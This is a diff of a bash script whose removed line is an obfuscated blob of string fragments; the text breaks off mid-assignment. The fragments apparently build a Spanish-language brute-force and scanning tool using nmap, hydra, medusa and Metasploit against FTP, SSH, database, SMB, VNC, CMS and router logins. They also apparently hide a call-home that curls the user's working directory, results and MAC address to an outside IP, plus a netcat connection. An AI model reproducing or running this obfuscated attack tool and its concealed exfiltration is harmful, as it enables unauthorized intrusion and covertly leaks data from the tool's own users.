@@ -1,4 +1,1049 @@
 #!/bin/bash
-z="
-";ZEz='a em';Ilz='t $u';EMz='t_pa';xWz='cisc';gjz='ora8';naz='=roo';IRz='-p $';aMz='ort ';KOz=' -x ';jnz='cane';VVz='o.tx';nYz='f2 -';dZz='u ad';qIz='orre';Baz=' 3| ';PQz='t 2>';Qjz='ONME';ZGz=' -o ';jjz='mera';KXz='0/op';rFz='rds.';NBz='|| |';ukz='n la';LMz='ath ';jEz='o de';bez='s ##';iNz='ip} ';gEz='r di';gTz='_URI';GNz='"_wp';VUz='OP_O';icz=' 80 ';fWz='re d';tKz='ds ?';Ebz='h ##';CRz='do"';jPz='eal_';mOz='OST ';pz='|   ';VFz=' 20 ';IGz='/* 2';liz='sfib';lIz='los ';aGz='top.';ubz='b >>';Khz='oDB ';fEz='nera';qez='"_54';lRz='t -f';lCz='ARG;';dQz='E ad';TJz='\n'\'']';Eez='le.t';OVz='=1" ';QKz='sepa';EPz='ogs/';SWz=':roo';jBz='\_/ ';bjz='ners';RUz='hp;s';GXz='SCO ';cRz='pl -';wCz='rint';yaz=' (Wi';Zez='tgre';qEz='de p';ePz='AMES';FBz='  / ';uXz='a=`g';Abz='s). ';yHz='ng 8';tQz='n"* ';QBz=''\''| \';Dz='[94m';vBz='niel';Nnz='ck -';uOz='t TA';Rbz='trad';ilz='re';OWz='dAdi';Fiz='info';vXz='--co';xbz='colo';kZz=' ]';Tfz='y -t';PIz='onIn';KKz=' mak';wez='5432';VOz='t PA';gCz='RG;;';lGz='ess"';wOz='URI ';XQz='I $p';sQz='hpmy';qRz='p.tx';TNz='$por';Hez='racl';Pjz='NVIR';EQz='ass.';KDz='done';pgz='-u r';iMz='nt =';OUz='I /$';BLz='YPE ';Nez='p;ru';Raz='minW';Fhz='06_p';Gkz='ra23';jGz=' "wo';hXz='s=1"';OCz='whil';hPz='host';RDz='DICT';gRz='m ph';rMz='icad';YHz='size';Ndz=' -M ';aLz='rvic';hfz='_872';iaz='//$i';bEz='a (U';dRz='p -p';Jhz='mong';nOz='$ip;';VKz='icio';Nkz=' ftp';gBz='__)_';Alz='iel;';Xcz='-t $';CIz='c 1 ';yjz='sora';NXz='p_10';KGz='v/nu';BBz='_/ |';lMz='ress';iWz='vos ';GOz=' -f4';Ziz='-M s';bXz='ILE0';cDz='[ ${';DYz='"[Ci';rGz=' "dr';mTz='ort;';afz='k.tx';HJz='h0 |';sWz='? s/';kHz='s';pLz=' 1`';mez='_543';ENz='"$ip';gJz='=$ma';umz='nnnt';xEz='Ejem';mYz=':"`';sLz='int=';Ojz='TI-E';rdz='tant';yTz='la.t';Unz='-a  ';qWz='ue d';NIz=' $co';USz='Web ';tez='-h $';RLz='min ';PMz='.129';fmz='pw-$';KWz='o:to';oJz='scan';xHz='=`pi';kOz='p;se';Blz='es;S';piz='_22_';Tez=' tee';nfz='IDAD';Slz='gene';Qcz='ftwa';aZz='; do';Wdz='s/or';Uz='33[9';Okz='_21_';bRz='Web.';cMz='d "/';idz='ient';mmz='w-$u';HUz='S_FI';qgz=' mys';ebz='trat';Ehz='"_33';igz=' est';Ybz='>>  ';MLz='\n\t';GLz=' $br';Bgz='l lo';iCz='   T';SKz='r';GKz=' &';Sdz='ql >';MNz='t .v';Kez='in;s';Qmz='_pop';MRz='in -';Dlz='rs_f';WOz='SS_F';XPz='ASS_';ATz='do'\'' ';STz='/joo';Sgz='=`my';UFz='") +';vbz='D -P';UWz='ot:r';Nfz='mon ';SPz='ess_';ZIz='etec';kMz='ordp';Ohz=' "nm';WIz='KRED';Mmz='p-$u';Vjz='"_21';tCz='G;;';Yaz='ss=r';tYz='gadm';TXz='p"';qPz='et T';Az='OKBL';Qlz='ame ';uUz='r ht';Bfz='"\nm';cJz='d&re';Uaz='rio:';mEz='ds)';viz=' sfi';Kjz='erJe';oLz='" -f';WRz='pal ';nDz=';the';AEz='ecto';ez=''\''  _';NPz='iary';GRz=' -t ';qHz='/* .';gNz='o $u';Mgz='lenn';jmz=' " l';iQz='SUCC';sgz='p"_3';ZDz='=${T';QPz='/htt';ZPz=';set';CWz='q 0 ';NQz='rt"_';Wkz='"[FT';uez='M po';eCz='AD=$';RVz='ado.';SNz='p"_"';UGz='f ba';KFz='izad';LCz='AR #';Vmz='rmir';Viz='u tb';xaz=' SMB';TLz='ESET';dIz='de i';CXz='r pa';BZz='bili';VWz='oot ';Tcz=' ###';FZz='ntah';LDz='ENTI';BKz='34 2';Jaz='4 --';EWz=' the';WFz='pass';FFz='ario';Jmz=' 0=p';Pz='3[92';NHz=' ins';OBz='| |/';yDz=' dir';siz='ordS';fKz='E En';qXz='p"_8';vkz='os? ';Jez='_log';pXz='s=1 ';GVz='at:t';edz='opt/';VYz='s/n ';ghz='alid';vWz='-i '\''';jLz='=`ec';EYz='sco]';UBz='( (_';oQz='niq ';kYz=' -f1';mgz='rrec';rlz='t| s';eIz='nter';waz='cios';Xdz='acle';WEz=' Nom';WVz='pata';kz='  __';Tkz='21_p';DXz='rd c';Ljz='t|KO';pkz='b';Jz='D='\''\';WSz='))';mMz='"* ]';Rdz='DAD ';kDz='} = ';thz='#$RE';qbz='s -P';jiz='ibak';VGz='se.t';Ncz='Soft';WWz='o:ro';Ogz='mysq';Ukz='r SU';cgz='ugh ';gFz='oft ';fiz='"_22';NEz='Torr';oNz='= *"';Ghz='s/mo';CHz='GB8L';JPz='le -';FEz='ansc';lKz='mini';Qbz='inis';qUz='t"* ';cEz='sado';MKz='wlin';ycz='p -M';kWz='O ac';XRz='-f t';Zbz='445_';MMz=' "/"';LRz='yadm';nkz='4 >/';Fnz='k_in';whz='t=re';khz='" lo';Hz='"30"';TSz='rep ';IZz='iste';YWz='ord:';wmz='vnc.';oBz=' '\''		';mPz='HOST';kjz='80_w';wTz='" > ';NSz='inst';Naz='ado1';vfz='-dic';Xkz='P] $';GFz=' con';kLz='ho $';fbz='"_44';fhz='q "V';ORz='/$pa';hEz='ccio';vGz='sult';BSz='dBD.';qTz='_SUC';VSz=' - 1';hnz='a ha';jRz='"/$p';bCz='e)  ';Tjz='" .b';sjz=' "no';cNz='band';wZz='":" ';mUz='mla.';Amz='res';AUz='p/jo';ySz='ntra';bFz='crac';gKz='cont';Ekz='a80 ';XIz=' No ';Ugz='-u m';ALz='[ $T';jJz='://6';mKz='stra';omz='w_pa';jlz='p50 ';RIz='et =';Hdz=' -h ';Cez='E_HO';cPz='TE_U';aKz=' "$T';Nhz='oDB.';mJz='.234';POz='/wor';yMz='comu';wMz='rase';rfz='28_p';Ylz='t # ';Hhz='ngoD';tEz=' a u';xhz='dis-';uKz=' s/n';xz=' ___';WUz='N_SU';Bkz='oImp';sez='gsql';sYz=' prt';pVz='p -i';COz='p | ';Sez='/vul';KPz='x "u';PLz='s we';wHz='rnet';hQz='er '\''';plz='bre';DUz='n;se';kUz='es/"';tWz='n $R';QYz='liza';pSz='ay e';lZz='re w';Ibz='n -P';uHz='xion';HKz='IFS=';eGz='else';cdz='QLPA';ymz='ck_i';Rez='nd'\'' ';SQz='et U';vCz='   p';rbz='1 $i';ydz='Y_PA';Adz=' mss';bTz='_FIL';fLz='t); ';fgz=' "El';SYz='aque';vNz='"org';INz='s.tx';ohz='s/re';jez='-M p';Enz=' "$n';Hnz=' -lt';pZz='01) ';REz='er)';Bmz='rnam';DDz='-$OP';Ufz=' -u ';lVz=' --t';YRz='xt" ';TRz='min|';sCz='PTAR';Cjz='s FT';Gnz='ces"';VEz='-e :';KYz='s/PR';fHz=' # d';kcz='e.tx';kVz=':b64';CDz='da: ';Xfz='ry t';BMz='t###';pYz='p:$p';aiz='sh" ';dgz='sock';MXz='.nma';wUz='uzz ';Vnz='t &';pOz=' USE';iOz=' $re';mBz='___/';Lkz='& $n';rQz=' *"p';Onz='-use';tJz='&';Bbz=' Win';kKz='e ad';dPz='SERN';qYz='/ -m';Qaz='"[Ad';CNz='".vu';ncz='sql.';EHz='/dev';Hiz=' (SF';Lz='91m'\''';Jfz='ik.t';pdz='t/or';GTz='ordB';xSz='enco';Rmz='rm p';bUz='xt 2';BYz='txt`';rSz='eb a';VQz='r ; ';VDz='ARY:';kJz='6.17';xjz='mpre';uBz='  da';THz=' .vu';pbz='tema';bJz='=$pw';cOz='E_US';hGz='op.t';riz='22_p';Iiz='I) a';OMz=' 190';UOz='m;se';aDz='YPE:';HCz='PEZA';jNz='== *';jYz=' cut';rhz=' red';cLz='admi';CKz='226 ';adz='expo';NOz='xili';MZz='ho a';fOz='0;se';wgz='_330';rcz='l.tx';AOz='`hos';HDz='exit';oGz='omla';Xez='es.t';sTz=' tru';NYz='RTG ';hMz='rpri';SSz=' | g';Jiz=' inf';pKz='ivos';rKz='aliz';uYz='t" >';EXz='isco';bQz='o ad';uGz=' .re';kkz='REPZ';qiz='SFI.';odz='=/op';KEz='ithu';jWz='CISC';ZNz='"\t\';NRz='d \"';ecz='t " ';EEz='or l';Rz='OKOR';oCz='   D';jDz='NARY';XZz='pent';BGz='dev/';ILz='orce';lXz='="ht';WYz='$RES';uEz='sar ';vTz='it\"';qmz='c.tx';PXz='"_tc';lPz='et V';Ajz='s/ft';kgz='ncio';TGz='Gen.';bNz=' Pro';LBz=') _ ';hOz='osts';Jlz='sers';qVz='q "2';UIz='hen';ZOz='set ';GCz='# EM';ylz='dtor';sdz='clie';Aiz='"[Re';uSz='p 30';eRz=' $po';ONz='rabi';iJz='http';unz='r" l';cGz='rm b';MFz='basa';xdz='BRAR';RWz='root';aXz='co:F';az='ins=';fXz='b64 ';Xmz='in"';hSz='eb_i';bbz='>  l';QVz='ivin';hcz='are.';MYz='re P';IMz='o $i';Udz='UCCE';PEz='lans';vaz='ervi';NCz='T"';FMz='th #';DNz='es2/';onz=' Che';kez='ostg';XTz='R_FI';yVz='[ $g';FLz='|| [';mcz='s/ms';tTz='e;ru';pGz='" >>';anz='$max';TZz='/n $';EUz='ER_F';iPz='s $r';gHz='elet';Hlz='full';SRz='t|ad';qCz='ONAR';Jcz='fi #';VNz='puse';Yfz='8728';Paz='t`';maz='do1.';RBz='_| |';Biz='dis]';Diz='form';Qgz='rd m';iiz='u sf';RKz='rato';LNz='en';YIz='se d';sJz='php ';WMz='-d "';TUz='RT $';LTz='a"* ';nbz='_445';hVz=':tom';Oz=''\''\03';YCz='case';Jdz='ssql';HMz='ort=';UMz='t | ';jTz='x.ph';nLz='d ";';Zdz='cle ';Hbz='ap -';HZz='re s';kGz='rdpr';Inz=' $ma';BUz='_bru';uCz='?)  ';JJz=' --c';Mez='S $i';rjz='0=$?';paz='LE0 ';JHz='os.7';cZz='ho -';Gez='in/o';olz=' nom';sNz='"net';Znz='ck (';wPz='"  >';OLz='ting';MPz='uxil';bIz='na c';rBz='ion ';eNz='n us';hNz='ser"';oaz='t:FI';ugz='M my';yPz='gs/c';OTz=' "ad';JIz='ceiv';mlz='muta';IPz='onso';nz='_)  ';rEz='assw';GPz='Pass';mjz='ta.t';ogz='nte"';Umz=' "Do';WNz='rs.t';Kaz='thre';cez='post';EJz='`ifc';AIz='.8.8';aFz='ados';Qiz='ando';mfz='$ENT';Snz=' cd=';Qhz='V -p';SEz='Opci';wz='|  _';xIz='/etc';jz=' __ ';xlz='` # ';Fez='/adm';JNz='t" ]';bWz='s/ci';Iz='OKRE';WGz='xt -';bBz='|  /';lDz='NULL';gez='dici';wJz=' -nv';Bz='UE='\''';dez='gres';EBz=''\''| |';FXz='s CI';fnz=' "To';sHz='}';pQz='> .v';Caz='f2`';Glz='pop.';FTz='t"_p';Ifz='kroT';SFz='icro';MGz=' $DI';TTz='mla_';UHz='lner';gnz='davi';CLz='= "c';WXz='p://';YMz='f 1`';IBz='|/ _';Kcz=' if ';ZXz='=cis';Ijz='rect';SZz=' ? s';lkz='sCYG';xMz='ñas ';VJz='pwd=';Ez=''\''';cnz='p 10';QCz='topt';Emz='n ho';PZz='izar';IFz='erso';AYz='K'\'' l';XYz='ET"';Ecz='p (E';rJz='gos.';gLz='ip_p';Dgz='v "u';ckz='2/* ';ZSz='ces ';yWz='o'\'' t';XDz='L}';OKz='he o';iFz='ompl';Whz='nmap';aNz='t[+]';haz='tps:';gYz='o';Ikz='ra21';pmz='s/vn';klz='-o p';UKz='serv';uMz='roba';aSz='$pas';oOz=' set';pnz='g su';KUz='t RH';wQz='hpMy';cFz='ker.';akz='a im';CMz=' $ip';Nbz='"\n ';lHz='inse';ACz='p.or';xCz='f "O';UUz='t ST';eez=''\'' to';JYz='"_80';efz='--di';Rkz='ftp"';HXz='ip i';GUz='RPAS';XSz='b_in';fFz='cros';DKz='-e /';gkz='dos.';YSz='stan';Xnz='x in';fcz='dZKS';HEz='r (h';KTz='ooml';GQz='\"" ';Fdz='-u s';Qkz='tp -';Pmz='ges ';Wiz='sai ';Ddz='sa -';njz='" .e';Oiz='[+] ';fz='____';ODz='TIDA';EIz='ev/n';Xgz='p`';sbz='p sm';AJz='olv.';Jkz=' -eq';vPz='run;';QFz='labr';pjz='_web';vVz='nado';Saz='eb] ';kFz='2: A';hYz=' $li';Yhz=' --s';Agz='ssfu';FRz='b.pl';DGz='rm .';QRz='" -u';XJz='curl';XVz='tor ';LWz=' Pas';WPz='et P';GBz='___)';QXz='p.gr';Nlz='lnam';sMz='o"';RNz='/"$i';Dnz='-l`';dWz='01.t';djz='23.t';Lgz='QL (';wbz='p --';XFz='word';Cgz='ep -';hIz='va! ';ujz='esor';Waz='espu';cQz='min"';FVz='tomc';vDz='scri';TMz='ip=`';wdz='D_LI';dCz='NTID';ahz='t=mo';aTz='PASS';aVz='thod';IQz='/cra';IYz='a" >';yIz='/res';OEz='es1/';lQz='l | ';UXz='rl=\';hz='    ';NJz='ther';yhz='p  >';tgz='306_';Dbz=' aut';IWz='t] $';VMz='cut ';WDz='=NUL';UDz='{DIC';iXz='80_p';ndz='DMIN';wKz=' bru';gbz='5_pa';yQz='n id';GEz='anne';wDz='pt e';HQz='logs';rVz='00 O';ciz='rdSF';fdz='orac';HBz=' _  ';MTz='+] J';AZz='.vul';XGz='t to';jkz='RHPe';nCz='d)  ';yiz='p in';Mcz='s/ZK';mRz='BD.t';FPz='king';rXz='0_pa';FSz='mla ';ccz='twar';AMz='2`';Nz='EEN=';tLz='`ech';Kbz=' 445';llz='3.tx';uWz='sed ';pHz='mv .';CCz='"$OK';Zlz=' en ';xYz='-u p';yLz=' ";"';sUz='t id';xiz='ix -';xNz='real';Niz='"\t ';FNz='"_"$';VHz='abil';Obz='hydr';JGz='>/de';vOz='RGET';cWz='sco4';ngz='tame';PYz=' Rea';rez='32_p';Wz='RESE';Zjz='3=1';bkz='ora"';tRz='s/cr';ZYz='G ##';vEz='(opc';KNz='; th';RFz='a "m';Piz='Prob';sGz='upal';GMz='##"';CSz=' wor';YJz=' --d';JWz=' (Us';xZz='-f2 ';TPz='logi';pJz='ner/';BDz='vali';Tz='='\''\0';Bnz='ck |';gDz=' && ';gWz='ispo';Tbz='P to';oKz=' act';wLz='| cu';Ocz='ware';tOz='; se';ZJz='ata ';GIz='| gr';oiz='s/vu';YXz='\" u';Mnz=' 10 ';mZz='eb 4';KHz='z';RJz='/[$'\''';mNz=' ${i';yBz='owas';Xbz='mb" ';SMz='80';NZz='os. ';eWz='xt ]';hhz=' cre';dGz='ase.';lWz='tivo';YZz='aho.';Llz='e); ';jbz=' -P ';qz='/  |';tBz='			 ';xJz=' 66.';aYz='prtg';FQz='ull';Mz='OKGR';Gz='ADS=';RPz='p/wo';xfz='er s';skz='E Ar';iDz='CTIO';Ffz='u $E';Pcz='ZKSo';Vz='3m'\''';Lnz='#Max';oZz='b (4';PFz='a pa';MUz=' AUT';hbz=' sop';bz='10';PVz='rdAd';Olz='e $f';FGz='erab';CYz=' -n ';Chz='i SU';WHz='idad';eYz='PRTG';VRz='|dru';eHz='0 rm';jOz='al_i';baz='do2.';vZz='*  ]';hCz='t)  ';Qnz=''\'' -P';mz=''\'' / ';pRz='f to';dFz='sh -';rLz='erpr';jXz=' 2>>';UNz='t"_w';Lmz='"_po';Vez='s/po';Wez='stgr';YOz='txt;';nEz='-d :';oez='res ';tjz='Impr';uRz='acki';Idz='-M m';CPz='""  ';bnz=')"';XUz='CCES';vMz='ndo ';RTz='ame.';niz=' ssh';yNz='_ip=';Efz=' n -';fRz='rt -';NDz='${EN';kiz=' -p ';Ldz='dm -';kQz='UL'\'' ';hHz='e em';BXz='adic';dz=' -e ';PUz='/ind';rRz='t >>';rUz='+] T';KSz='e tr';Jbz='n -p';Rhz='-scr';XOz='ILE ';xLz='t -d';LLz='BLUE';Afz='432_';kPz='ip;s';HTz='D.tx';DTz='uniq';Sbz='or -';Bdz='ql" ';pcz='SQL ';JTz=' *"j';QQz='s $i';DOz='head';OJz=' "|$';iRz=' -d ';ZBz=' V /';sRz=' log';Mlz=' ful';RSz=' aux';DMz='_por';XMz=':" -';Ydz=' ora';Odz='l" >';wVz='rc=$';jdz='_18_';pDz='cat ';lBz='_)__';kdz='3';xXz='neve';TKz=' -f ';tz=''\''| /';mSz='i] T';uhz='s-br';oHz='py';xTz='joom';WBz=' (/ ';eQz='ME a';ZZz='txt)';EDz='TARG';hgz='o no';JMz='p_po';bLz='ios/';caz='2.tx';agz=' ser';LQz='ip"_';bGz='txt';sEz='ords';eLz='b.tx';HVz='t -e';eZz='xt  ';YNz=' do';qnz='cces';hDz='${DI';wjz='$noI';hjz='0=1';dVz='=$ip';BQz='ing/';jcz='ordZ';LXz='en" ';bVz='=GET';IHz='ltad';tVz='ordA';QLz='b ad';dbz='45_p';LFz='os (';VBz='|< (';AHz='eREP';CVz='  us';KQz='g/"$';AWz='repr';QWz='do.t';Xhz='-sV ';PWz='vina';uaz='ndow';PCz='e ge';Tlz='rate';PKz='nly ';Zkz='s un';DQz='essP';PGz=' $EN';HNz='user';XCz='do';iIz='Algu';Yez=' pos';hkz='db -';HHz='resu';vKz='read';wlz='rds2';EVz='ass=';kmz='p"_p';Mfz=' com';JXz='q "8';iSz='nsta';aCz='S in';DEz='do p';bOz='ERAT';wXz='lor=';nPz='t US';pez='s >>';xKz='tefo';ddz='TH=/';AFz='1: A';QUz='ex.p';hJz='c"  ';Qez=''\''Fou';gfz='nary';Mdz='t -h';xcz='h $i';gUz='"_jo';kEz=' pas';nnz='ces)';IJz='grep';CUz='rce_';TWz='s=ro';Ccz='d:'\'' ';SIz='= 0 ';xQz='Admi';Gaz='E0 0';ucz='n -u';HGz='ades';WKz='s/ad';glz='mer ';kXz='_80_';Xaz='esta';Qfz='k ##';mVz='hrea';BNz='....';fez='t	#a';BTz='xt |';Hcz='agad';mhz='"[Mo';ASz='_pas';dOz='ERNA';pPz=' ; s';Vcz='"pas';QMz='.69.';Flz=' POP';yez='p"_5';eVz='th  ';dHz='gs -';cYz='rd p';rHz='2 2>';FJz='onfi';ADz='n in';Shz='ipt=';fZz='p 2';wEz='l)';Ubz='t -t';yYz='t > ';FYz=' Usu';Pbz='a -l';KRz='phpm';DSz='ss -';qNz='*  |';IXz='n $(';aJz='"pwd';SVz='2>> ';bgz='thro';CJz='`';IDz=' 2;;';jhz='ials';oUz=' *"t';uNz='!= *';Cbz='dows';APz='un;e';JFz='nall';qkz='POP ';vjz='a21 ';bMz=' ":"';Zgz='ySQL';nHz='ata.';SOz='ogin';IEz='ttps';cBz=''\'' \_';gdz='le/i';Siz='fect';NLz=' Tes';gVz='mcat';alz=' a s';pMz=' ide';nRz='xt &';YYz=' PRT';Riz='r de';Kkz=' 1 &';YVz='_fuz';flz=' pri';daz='spue';QIz='tern';sPz='TURI';Rjz='NT|X';qGz=' top';MSz='Web_';fIz='net ';JZz='mas ';qLz='fing';DFz=' dic';rOz='E $u';tFz='EOF';nNz='p} =';gOz='t rh';QGz='D > ';iBz=')___';SHz='find';Vaz='n $r';KCz='ACKE';KBz='| / ';Dfz='a -e';dNz='o co';HPz='msfc';hRz='pmya';MOz='e au';HSz=' dru';Hjz='etDi';BVz='rl=$';ZWz='rt_d';qMz='ntif';AGz=' 2>/';ikz='pcAN';Njz='|MUL';bKz='YPE"';ojz='on2/';sVz='K" l';Dmz='pop_';EGz='vuln';Sz='ANGE';Gbz='=`nm';jCz='YPE=';ejz='"_23';Icz='o)"';iYz='ne |';snz='nist';PJz='{res';bDz='if [';FKz='bash';Qz='m'\''';Eaz='ss=a';HRz='$ip ';mXz='tp:/';xBz='res@';nWz='eali';nZz='01 a';tMz='+] P';HIz='ep "';qQz='des/';Lcz='ce';HFz='ds p';Miz='FI) ';Wcz='.pl ';xFz='raci';BRz='fica';Ycz='ip -';KIz='ed" ';pEz='iona';Dkz=' $no';bhz='ngod';fQz='dmin';qJz='codi';JUz=''\'';se';Lez='et R';Bcz=''\''pas';tcz='dusa';tkz='chiv';MQz='"$po';AKz='33.2';WCz='S';blz='u us';xUz='meth';elz='solo';ANz='nes ';jaz='p/" ';dMz=' 4`';OZz='Real';jUz='iq >';clz='s2.t';pCz='ICTI';cmz='  ##';JRz=' -m ';lJz='2.33';ELz=' ]] ';yGz='NRHP';Wlz='ame"';Zcz='p $p';Pnz='r '\''a';Wgz='w $i';oXz='/" u';ffz='ctio';JOz='sole';cbz='p"_4';EKz='bin/';aaz='0 0=';DPz='>> l';Ynz='cias';GYz=':cis';Zhz='crip';dDz='DAD}';RRz=' roo';uLz='o $l';BPz='xit\';jZz='b401';OXz='00p/';imz='new ';Ujz='rs2/';yfz='ucce';vJz='p nc';Sjz='erox';Ggz='ful"';OGz='then';lOz='t VH';sBz='1.1'\''';nKz=' web';vFz='rm e';UYz='s ? ';mHz='rt-d';tfz='ikro';giz='dSFI';YGz='p200';lnz='e nc';GWz='ord ';YKz='web.';Fcz='quip';eDz=' = N';Xjz='ora2';ZKz=']';oTz=' STO';ggz='vici';rIz='ctam';kaz='s=ad';Cmz='e $u';Fmz='st=$';jHz='file';DZz='s/"$';hmz='er "';uZz='ttp"';bHz='nt0 ';ETz=' > .';rNz='| ${';BHz='ZsCY';sSz='ctiv';Ciz='s/in';Igz='MySQ';FCz='####';mFz='ta d';uJz='nohu';MBz=' )/ ';nVz='ds=1';sZz='} ==';dKz='t $O';OFz='en l';dXz='e us';rZz='ine"';gz='_   ';oDz='n';hlz='nomb';Ejz='ftp.';fNz='uari';IIz='1 re';vLz='ine ';WTz='ce_l';yRz='ort"';tHz='cone';tUz='tato';LGz='ll';Kiz='ormi';Vdz='SS l';BWz='c -e';qlz='xt p';Ulz='d.pl';Omz='essa';NFz='dos ';Vbz=' 1 $';eUz='ul l';rTz='CESS';yz='_  _';Acz='ver ';hUz=' | s';JCz='A CR';Bhz='er -';ZMz='port';dhz='ute ';Lbz=' *"o';Pdz='l >>';YDz='TYPE';DHz='64 >';GZz='t ]';Rfz=' "mk';Cz='\033';YQz=';run';NGz='] ; ';LVz='64 -';NVz='eads';Wfz='dict';MDz='DAD=';ulz='il -';lYz=' -d"';vYz='d / ';Iaz='s:b6';nTz='min;';UVz='inad';ofz='icti';rmz='VNC ';YEz='de l';Bez='RACL';RYz='r at';Oez='it" ';MVz='-thr';Fjz='q "P';FHz='/nul';RQz='p; s';VCz='TION';tmz=' (le';GDz='$0';Nmz='er m';Zz='max_';Hmz='ser=';VZz='taho';okz='os.d';fJz='&mac';ZHz='  0 ';XWz='ot P';Fz='THRE';JEz='://g';QTz='sern';Iez='e/or';eMz=' ""';Rcz='re a';kRz='ath/';mbz='  lo';tIz=' $RE';Scz='s ZK';tdz='nt_1';fMz='[ $f';jMz=' *"w';pWz='ataq';JLz=' == ';eKz='KBLU';IUz='LE '\''';MWz='d:to';TEz='ones';oz='  | ';Klz='_fil';Ihz='B.tx';iKz='anel';Kfz='Mikr';iUz='| un';Pez='gs/v';jFz='eto';fUz=''\'' lo';Mbz='pen"';MIz=' -l`';shz='is #';Hkz='[ $n';NWz=')" >';Rnz='t -g';ERz='ssWe';uIz='SET"';pTz='P_ON';jSz='nces';ldz='rt T';cXz=' 0=t';EFz='cion';JSz='p 5';DLz='eto"';Xiz='-p T';Lhz='  mo';Djz='P ##';xgz='6_pa';KVz='ss:b';ZVz='z me';OSz='ance';dLz='n-we';Pkz='-u f';Yz='e[0m';KJz='olor';Wnz=' "Ma';fPz=' 0;s';pBz='				';tnz='rado';Akz='21 n';eBz='_||_';kBz=' |_(';smz=' VNC';SDz='IONA';gMz='inge';cCz='   E';saz='2> l';rWz='rds ';mkz='B8L6';lcz='rdZK';Ngz='nto)';CBz='| | ';QEz='cann';LYz='TG.t';Anz='=`pg';wYz='-m P';Zaz='oot:';aHz='-pri';Vhz='p"  ';Knz='s ] ';qDz='<< "';VIz=' "$O';wWz='1 i\';lEz='swor';ygz='istr';Cfz='edus';Wbz='ip s';YPz='FILE';hiz='-p t';oSz='ia h';Maz='1 >>';taz='s/Wi';gcz='oftw';qaz='0=to';Bjz='FTP ';wfz='ary ';qZz='web4';nmz='>> .';enz=' 0 ]';eaz='sta"';hFz='-t c';Zfz='dMik';dlz=' bas';vIz='reso';UPz='n_en';GHz='l';gXz='--th';BIz='.8 -';BCz='g'\''';OHz='ert_';LEz='b.co';lmz='op3p';TBz='( | ';mnz=' ($n';Wjz='noIm';Mhz='B ##';sfz='ordM';rPz='ARGE';YLz='$(ca';uz='___ ';LUz='OSTS';wGz='.7z ';qFz='d pa';nBz=' '\'''\''';uTz='n;ex';DJz='mac=';LJz='=nev';EZz='s/pe';Xlz=' > p';iTz='inde';dTz=' RHO';dkz='7z a';EOz=' -1 ';mdz='NS_A';RXz='ep';Vlz=' "$f';dcz='e -u';AXz='xt	#';aIz='to u';TFz='soft';Gcz='o ap';FWz='i] P';NKz='es t';iVz='-e u';Uhz='e $i';ZTz='USER';sz='|'\''';iGz='xt';GGz='ilid';ESz=' joo';oVz='egre';TQz='AME ';Qdz='-u $';qKz='. Re';lz=' '\''';FIz='ull ';lSz='t 0 ';Ucz='re.t';Oaz='1.tx';DRz=' "pa';lFz=' lis';inz='y es';mWz='s. R';Zmz='p3pw';hBz='| \_';Gmz='ip u';YBz='   \';oPz='ME $';acz='-m Z';PNz='lida';yUz='od=G';dEz=' par';xez='es >';BOz='t $i';MHz='tion';Tmz='s3.t';Edz='e n ';VLz='for ';ifz='8_pa';TCz='t:h:';Ofz=' Mik';nez='2_pa';sOz='ser ';oYz='d":"';tDz='utar';XLz=' in ';KLz='"s" ';gZz='tee ';ISz='slee';DCz='GREE';qfz='"_87';wkz='Form';yJz='172.';JVz='r_pa';WQz='ETUR';mCz=';';tlz='=`ta';fkz='ulta';pNz='com"';rgz='3306';knz='os d';rYz='G -u';VXz='"htt';ocz=' MS-';Tiz='o (S';mGz=' >> ';TDz='RY=$';tbz='b" >';XEz='bre ';raz='=1 >';hWz='siti';lbz=' smb';Taz='Usua';rnz='#"';DBz='//| ';Jjz='|Las';XBz='/| |';gSz='assW';wIz='lv=`';tGz='7z x';TIz=']; t';JDz='esac';Ygz=' *"M';Phz='n -s';lTz='T $p';udz='8_3';scz=' "me';gPz='et r';HLz='utef';WJz='`pwd';ybz='r=ne';Dhz='S lo';VTz='efor';YUz='S tr';Vkz='xt`';aUz='xit"';oFz='sswo';PSz='s=$(';aez='s ac';IOz='fcon';aWz='ata';wiz='u in';MJz='er e';QNz='des2';FDz='\n" ';GSz='xt >';qdz='/ins';gIz='acti';hdz='ntcl';wSz='k';NTz='a id';QDz='ULL}';sXz='resp';UEz=':';Cdz='medu';laz='min:';Aaz='"/"`';xPz='> lo';ykz=' Dan';bYz='n'\'' t';RGz='base';vdz='rt L';sIz='ente';Imz='rd=F';gGz='RY t';NUz='H_UR';LSz='ue; ';Vfz='n --';URz='s|jo';pFz='rds';eFz='e mi';jVz='ser_';aBz=' | |';NNz='ulne';kCz='$OPT';XKz='min-';cHz='|xar';PHz='data';tiz='FI.t';tSz='es)"';UCz='" OP';ihz='dent';XXz='$ip/';dBz='_)_|';nFz='e pa';iLz='path';Ymz='0;';xVz='?';XHz='es -';nIz='unci';tNz='"* |';yKz='rce';ufz='Tik.';Uez=' -a ';dmz='pw.t';Kdz='-u a';hez='d po';miz='ak -';Fkz='3 $n';ZRz='"_pa';Rlz='###"';lNz='* ||';eJz='=$re';TVz='Adiv';fVz='s=to';yZz='| tr';HWz=' "[T';NMz='3` #';RZz='que ';IKz='$'\''\n';oMz='+] W';qOz='RNAM';RMz='107:';LKz='e ne';hTz=' /$p';ICz='NDO ';Vgz=' -pw';OYz='vos.';Pfz='roTi';diz='I.tx';SXz='"[+]';Cnz=' wc ';bmz='pw a';yOz='h ;r';TOz='_enu';Faz=':FIL';Dez='ME=/';nGz=' "jo';vlz='1 pa';VPz='um;s';Uiz='FI)"';Egz='nsuc';aOz='ENUM';iZz='s/we';LHz='func';qcz='mssq';Laz='ads=';SGz='.txt';KZz='de P';Pgz='l'\'' t';sKz='ar a';XNz='xt);';amz='pop3';Clz='andi';CTz=' sor';Kgz=' MYS';yCz='pcio';Haz='=top';vgz='sql"';sDz='Ejec';jfz='rdMi';PDz='D:=N';bZz='-m p';QHz=' () ';DWz=']] ;';mDz='  ]]';lLz=' | c';Xz='T='\''\';vcz=' sa ';xOz='$pat';uPz='th ;';Hgz='s/my';ehz='r -i';CZz='dade';vQz='+] p';Fgz='cess';qSz='eos ';eXz='ass:';bfz='mkbr';LIz='| wc';fGz='mv $';oRz=' adm';cKz='"\n\';RCz='s ":';yEz='plo ';mQz='sort';yXz='r '\''2';Mkz=' 1 ]';Dcz=' "$i';pUz='omca';phz='dis.';nXz='/$ip';dUz='essf';cUz='Succ';Gfz='AD -';wFz='nume';sFz='txt ';eTz='STS ';Kmz='pop-';nlz='e su';eEz='a ge';xDz='n el';Yiz='bsai';wRz='$ip"';nMz='"\t[';uQz=']]; ';pIz='an c';dnz=' -gt';dfz='.py 